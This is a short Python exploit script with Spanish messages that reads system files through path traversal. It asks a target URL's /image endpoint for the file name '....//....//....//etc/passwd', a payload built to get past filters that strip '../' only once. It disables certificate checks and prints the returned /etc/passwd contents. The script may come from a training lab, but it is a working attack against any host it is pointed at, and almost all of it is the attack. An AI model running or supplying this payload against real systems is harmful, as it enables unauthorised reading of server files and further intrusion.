#!/usr/bin/env python3
import requests
import urllib3
import sys

urllib3.disable_warnings()

gyC="\033[0;37m\033[1m"
yC="\033[0;33m\033[1m"
bC="\033[0;34m\033[1m"
gC="\033[0;32m\033[1m"
rC="\033[0;31m\033[1m"
eC="\033[0m"

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"\n{yC}[+] {gyC}Uso: {gC}{sys.argv[0]}{eC} ")
        sys.exit(1)
    url = sys.argv[1].strip("/")
    response = requests.get(
        url+"/image?filename=....//....//....//etc/passwd",
        verify=False
    )
    
    print(f"{yC}[+] {gyC}El contenido obtenido es:\n\n{eC}{response.text}{eC}")
    
